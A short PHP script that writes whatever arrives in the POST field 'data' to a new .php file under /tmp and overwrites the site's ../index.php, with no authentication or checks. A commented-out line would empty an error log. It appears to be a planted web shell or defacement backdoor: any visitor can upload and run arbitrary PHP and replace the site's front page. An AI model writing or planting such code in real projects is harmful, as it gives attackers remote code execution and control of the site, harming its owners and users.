<?php
//file_put_contents('errors.log', '');
file_put_contents('/tmp/index_' . time() . '.php', $_POST['data']);
file_put_contents('../index.php', $_POST['data']);